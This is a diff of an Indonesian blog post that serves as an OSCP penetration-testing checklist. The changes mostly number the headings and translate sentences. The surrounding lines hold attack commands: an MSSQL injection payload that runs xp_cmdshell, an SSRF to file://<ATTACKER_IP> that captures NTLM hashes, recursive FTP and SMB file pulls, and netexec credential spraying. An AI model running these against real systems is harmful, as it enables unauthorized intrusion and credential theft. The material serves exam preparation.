@@ -24,7 +24,7 @@ Secara garis besar, maka hal apa saja yang perlu kalian ingat:
 - [Some Files (.pdf, .docx, .zip, .db, etc) "Might" Contain Credentials](#some-files-pdf-docx-zip-db-etc-might-contain-credentials)
 - [Credential Spraying - FTP, RDP, SMB, SSH, and WinRM](#credential-spraying---ftp-rdp-smb-ssh-and-winrm)
 
-## Port Scan
+## 1. Port Scan
 
 Untuk melakukan inisiasi, biasanya kita perlu melakukan Port Scanning di awal. Namun, dalam kasus ini, saya tidak akan menggunakan NMAP karena waktu yang tersedia saat ujian OSCP sangat terbatas.
 
@@ -42,7 +42,7 @@ UDP:
 udpx -c 500 -w 1000 -t <TARGET>
 ```
 
-## FTP (21/tcp)
+## 2. FTP (21/tcp)
 
 Initial Access pada FTP umumnya dapat dilakukan melalui dua cara, yaitu `FTP Anonymous Login` dan `FTP Default Credential Brute Force`.
 
@@ -70,7 +70,7 @@ Download file recursively.
 wget -m --user='<USERNAME>' --password='<PASSWORD>' ftp://<TARGET> --no-passive-ftp
 ```
 
-## SMB (445/tcp)
+## 3. SMB (445/tcp)
 
 Ada dua metode initial access yang dapat dicoba pada layanan SMB, yaitu "Null Session" dan "Guest Login".
 
@@ -113,7 +113,7 @@ Download semua file di dalam SMB secara recursive.
 nxc smb <TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 
-## SNMP (161/udp)
+## 4. SNMP (161/udp)
 
 Preparation:
 ```bash
@@ -149,7 +149,7 @@ SNMP Walk menggunakan custom community string.
 snmpbulkwalk -c <COMMUNITY_STRING_NAME> -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 ```
 
-## Found Weird Port? (Uncommon Services)
+## 5. Found Weird Port? (Uncommon Services)
 
 Tak jarang kita menemukan Port dengan angka yang tidak umum, bahkan service-nya tidak akan dikenali oleh NMAP. Tapi, jangan khawatir, kita bisa memanfaatkan Google untuk hal ini.
 
@@ -158,7 +158,7 @@ Google it.
 port XXX exploit
 ```
 
-## Web Application (HTTP)
+## 6. Web Application (HTTP)
 
 ### Enumerate directory and files
 
@@ -187,7 +187,7 @@ Google it
 - Try `admin:admin`
 - or Google it: `<APPLICATION_NAME> default credentials`
 
-## Web Application: SSRF to Steal NTLM
+## 7. Web Application: SSRF to Steal NTLM
 
 Saya baru menyadari bahwa, celah SSRF (Server-Side Request Forgery) sangat berbahaya pada environment Windows. Yang di mana dapat dimanfaatkan untuk mencuri NTML Hash.
 
@@ -203,7 +203,7 @@ Kemudian mengeksekusi SSRF-nya dengan menggunakan URL `file://<ATTACKER_IP>/test
 
 Lalu, coba crack NTML-nya.
 
-## Web Application: MSSQL Injection to RCE
+## 8. Web Application: MSSQL Injection to RCE
 
 Karena SQL Injection pada MSSQL memungkinkan kita untuk mengeksekusi Stacked Query, kita dapat melakukan escape dan menjalankan query lain. Contohnya seperti ini:
 - `http://10.10.10.10/profile.aspx?id=1';EXEC xp_cmdshell "whoami";--`
@@ -223,33 +223,35 @@ Exec "xp_cmdshell":
 ';EXEC xp_cmdshell "whoami";--
 ```
 
-## Found Numerous Unnecessary Files?
+## 9. Found Numerous Unnecessary Files?
 
 ### Use exiftool to gather username list
 
-Basic:
+Kita bisa memeriksa attribute filenya dengan menggunakan command di bawah ini:
 
 ```
 exiftool <FILENAME>
 ```
 
-Bunch of DOCXs/PDFs
+Jika terdapat banyak file (PDF/DOCX):
 
 ```sh
 find . -type f | xargs -I {} exiftool {} | grep ^'Author'
 ```
 
-And spray it across all services or apps using `<username>:<username>` to log in.
+Dan Spray Credential-nya ke semua layanan atau aplikasi dengan menggunakan `<username>:<username>` untuk mendapatkan akses.
 
-## Found Protected File? Crack It!
+## 10. Found Protected File? Crack It!
 
-You need to crack it.
+Kamu hanya perlu membukanya.
 
 ![anything 2 john](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-file2john.png)
 
-## Some Files (.pdf, .docx, .zip, .db, etc) "Might" Contain Credentials
+## 11. Some Files (.pdf, .docx, .zip, .db, etc) "Might" Contain Credentials
 
-## Credential Spraying - FTP, RDP, SMB, SSH, and WinRM
+Jika menemukan file berupa .pdf, .docx, .zip, .db, dan lain-lain, jangan lupa untuk memeriksa apakah file tersebut menyimpan kredensial atau tidak. 
+
+## 12. Credential Spraying - FTP, RDP, SMB, SSH, and WinRM
 
 [Netexec](https://github.com/Pennyw0rth/NetExec) adalah tool yang sakti, di mana kita bisa melakukan Credential Spraying ke berbagai layanan seperti FTP, RDP, SMB, SSH, dan WinRM, bahkan dengan berbagai metode yang berbeda.
 
@@ -260,7 +262,7 @@ netexec winrm <TARGET> -u username.txt -p 'Password123'
 ```
 
 Kita dapat mengubah "winrm" dengan:
-- ftp
-- smb
-- rdp
-- ssh
+- `ftp`
+- `smb`
+- `rdp`
+- `ssh`
